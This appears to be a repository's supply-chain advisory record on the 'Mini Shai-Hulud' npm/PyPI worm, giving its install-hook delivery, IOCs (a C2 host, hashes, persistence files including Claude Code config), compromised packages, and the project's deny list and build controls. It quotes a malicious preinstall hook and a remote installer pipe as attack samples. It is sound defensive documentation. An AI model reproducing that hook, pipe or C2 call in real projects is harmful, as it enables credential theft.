# Supply-chain advisory snapshot — "Mini Shai-Hulud" / "Shai-Hulud: Here We Go Again"

**Snapshot taken:** 2026-08-17 (before any dependency was added to this repository)
**Taken by:** repository bootstrap, per the project's release-blocking supply-chain policy
**Policy rule:** dependency changes are **fail-closed** against this snapshot. Re-take the snapshot
before any future dependency change and update this file (do not edit history — add a new dated file).

> This file is a *record of external reporting*, not original research. Every claim below is
> attributable to a source in the "Sources" section. Where reports disagree (e.g. package counts),
> both numbers are kept.

---

## 1. Campaign summary

A cross-ecosystem (npm + PyPI) self-propagating credential-stealing worm, tracked as
**"Mini Shai-Hulud"** and self-labelled **"Shai-Hulud: Here We Go Again"**, attributed by Microsoft
to the actor **TeamPCP**. First large wave reported **2026-05-11**, with further waves through 2026.

Reported blast radius (varies by reporter and date):

| Reporter | Scope reported |
| --- | --- |
| Microsoft Security | `@antv` scope compromise + downstream amplification |
| StepSecurity | 500+ packages across AntV ecosystem and standalone libraries |
| safedep | a later wave of 317 npm packages |
| Expel / Arctic Wolf | ~170+ packages incl. TanStack, Mistral AI, OpenSearch ecosystems |
| CSA Singapore | ongoing wave affecting `keyv` **and related caching packages** |
| Aggregate reporting | ~1,300 package versions; ~2B monthly downloads combined |

Affected supply chains reported: **npm, PyPI, GitHub Actions, Docker images, VS Code extensions.**

## 2. Execution and propagation mechanism

The worm's entire delivery depends on **package manager lifecycle scripts**:

* **Pattern A — direct install hooks.** A malicious `preinstall` / `postinstall` in `package.json`, e.g.
  ```
  "preinstall": "node -e \"require('child_process').spawnSync('bun',['run','index.js'],{stdio:'inherit'})\""
  ```
* **Pattern B — poisoned Git dependency.** An `optionalDependencies` entry pointing at a specific
  commit of a legitimate repository (`antvis/G2`), where the poisoned commit carries a `prepare`
  hook running `bun run index.js && exit 1`.

Execution chain: `node` → shell → **`bun`** (installed on demand via `curl -fsSL https://bun.sh/install | bash`)
→ obfuscated payload. The payload daemonizes behind a `__DAEMONIZED=1` re-entry guard, harvests
credentials from `/proc/*/mem`, 130+ file paths and environment variables, then exfiltrates over the
GitHub API (dead-drop) or TLS to C2. It **forges SLSA provenance attestations through Sigstore** and
hijacks GitHub Actions workflows to mint valid publish tokens, which is how it self-propagates.

**Consequence for this repo:** disabling lifecycle scripts, banning Git/tarball dependencies, and
banning remote installer pipes each independently break the documented delivery paths. All three are
enforced — see §5.

## 3. Indicators of compromise (IOC)

### Network
* `t.m-kosche.com:443` — C2, path `api/public/otel/v1/traces` (masqueraded as an OpenTelemetry collector)
* `api.github.com` abused as a dead-drop (via the `antvis/G2` repository)
* Spoofed User-Agent: `python-requests/2.31.0`
* `bun.sh/install` fetched at install time (second-stage runtime acquisition)

### Files / artifacts
* `Index.js`, `index.js` — first-stage loader (anomalous size **486–498 KB**)
* `cat.py` — Python backdoor
* `.claude/settings.json`, `.claude/setup.mjs` — **Claude Code persistence**
* `.vscode/tasks.json`, `.vscode/setup.mjs` — VS Code persistence
* `.github/workflows/codeql.yml` — injected workflow (name-squats a legitimate workflow)
* Second stage invoked as `bun run .claude/`

### Hashes (SHA-256)
* `a68dd1e6a6e35ec3771e1f94fe796f55dfe65a2b94560516ff4ac189390dfa1c` — malicious payload
* `fb5c97557230a27460fdab01fafcfabeaa49590bafd5b6ef30501aa9e0a51142` — Python backdoor

### Campaign fingerprints
* Repository description, reversed: `niagA oG eW ereH :duluH-iahS`
  (forward: `Shai-Hulud: Here We Go Again`) — 2,200+ public repos created with stolen tokens
* Repository names: Dune terminology (`atreides`, `fedaykin`, `harkonnen`, …) + random digits
* Commit-message marker: `IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner`
* Obfuscation: 1,732 Base64 strings with array rotation (shuffle key `0xa31de`); custom PBKDF2+SHA-256 string cipher
* Host signal: unexpected `python3` processes reading `/proc/*/mem`

### Secrets targeted
GitHub tokens (`gh[op]_…` PATs, `ghs_…` installation tokens, `GITHUB_TOKEN`), npm publish tokens,
AWS IAM keys + SecretsManager, HashiCorp Vault tokens (multiple paths), Kubernetes service accounts,
1Password credentials.

## 4. Named packages (non-exhaustive)

Specific compromised versions named in reporting:

| Package | Compromised versions reported |
| --- | --- |
| `timeago.js` | 4.1.2, 4.2.2 |
| `echarts-for-react` | 3.0.7, 3.1.7, 3.2.7 |
| `jest-canvas-mock` | 2.5.3, 2.6.3, 2.7.3 |
| `@antv/g2` | 5.5.8, 5.6.8 |
| `@antv/g6` | 5.2.1, 5.3.1 |
| `@antv/l7` | 2.26.10, 2.27.10 |
| `@antv/*` | 400+ scoped packages |
| `size-sensor` | reported compromised (4.2M downloads/month) |
| `keyv`, `cacheable`, `flat-cache`, `file-entry-cache` | reported affected (CSA Singapore) |

Socket maintains a continuously updated affected-package list; treat the table above as a snapshot,
not as the authoritative set.

## 5. Enforcement in this repository

The blocklist below is enforced by `scripts/supply-chain/deny-list.mjs`, which fails the build if any
entry appears **anywhere** in the resolved dependency graph (direct or transitive).

**Denied outright** (per project guardrail, entire caching family regardless of version):
`keyv`, `cacheable`, `flat-cache`, `file-entry-cache`, `cacheable-request`, `cache-manager`, `@cacheable/*`

**Denied by name** (campaign-implicated): `@antv/*`, `echarts-for-react`, `size-sensor`, `timeago.js`,
`jest-canvas-mock`.

**Structural controls** (`pnpm-workspace.yaml`, `.npmrc`, CI):

| Control | Setting / script | Breaks which attack step |
| --- | --- | --- |
| Lifecycle scripts disabled | `ignoreScripts: true`, `onlyBuiltDependencies: []`, `dangerouslyAllowAllBuilds: false` | Pattern A and B execution |
| No Git/tarball/remote deps | `scripts/supply-chain/dep-shapes.mjs` | Pattern B |
| Release-age cooldown | `minimumReleaseAge: 10080` (7 days) | catches waves during the reporting window |
| Frozen lockfile | `--frozen-lockfile` in CI, `verifyDepsBeforeRun` | silent version drift |
| Store integrity | `verifyStoreIntegrity: true` | tampered tarballs |
| Integrity + provenance audit | `scripts/supply-chain/provenance.mjs` | records attestation state (note: attestations are forgeable per §2, so this is evidence, not proof) |
| Vulnerability scan | `scripts/supply-chain/osv-scan.mjs` (OSV.dev) | known-vulnerable versions |
| IOC sweep | `scripts/supply-chain/ioc-scan.mjs` | on-disk artifacts from §3 incl. `.claude/setup.mjs` |
| SBOM | `scripts/supply-chain/sbom.mjs` (CycloneDX 1.6) | post-hoc incident response |
| Quarantined acquisition | `pnpm run deps:quarantine` | credential theft during install |

**Deliberate note on provenance:** because the worm forges Sigstore attestations, a present
attestation is *not* treated as sufficient evidence of integrity here. The provenance script records
attestation state for incident response; the release gate relies on the release-age cooldown,
the frozen lockfile, disabled lifecycle scripts, and the deny list.

## 6. Result of this snapshot against the chosen dependency set

Run `pnpm run security:audit` to reproduce. At bootstrap (2026-08-17) the resolved graph contained
**none** of the denied names. In particular the Fastify stack caches with `toad-cache`, **not** with
the `keyv`/`cacheable` family, and no direct or transitive dependency declares an install script.

## Sources

* Microsoft Security Blog — *Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft* (2026-05-20)
  <https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/>
* StepSecurity — *Shai-Hulud: Here We Go Again. Mass npm Supply Chain Attack Hits the AntV Ecosystem*
  <https://www.stepsecurity.io/blog/shai-hulud-here-we-go-again-mass-npm-supply-chain-attack-hits-the-antv-ecosystem>
* Cyber Security Agency of Singapore — *Ongoing npm Supply Chain Attack Affecting Keyv and Related Packages* (AD-2026-009)
  <https://www.csa.gov.sg/alerts-and-advisories/advisories/ad-2026-009/>
* safedep — *Mini Shai-Hulud Strikes Again: 317 npm Packages Compromised*
  <https://safedep.io/mini-shai-hulud-strikes-again-314-npm-packages-compromised/>
* Expel — *Mini Shai-Hulud: Cross-ecosystem supply chain worm targeting npm & PyPI*
  <https://expel.com/blog/mini-shai-hulud-cross-ecosystem-supply-chain-worm-targeting-npm-pypl/>
* Arctic Wolf — *Mini Shai-Hulud: Supply Chain Malware Attack*
  <https://arcticwolf.com/resources/blog/mini-shai-hulud-supply-chain-malware-attack/>
* Snyk — *TanStack npm Packages Hit by Mini Shai-Hulud*
  <https://snyk.io/blog/tanstack-npm-packages-compromised/>
* NHS England Digital — *Supply Chain Attack Affecting Numerous npm and PyPI Packages* (CC-4781)
  <https://digital.nhs.uk/cyber-alerts/2026/cc-4781>
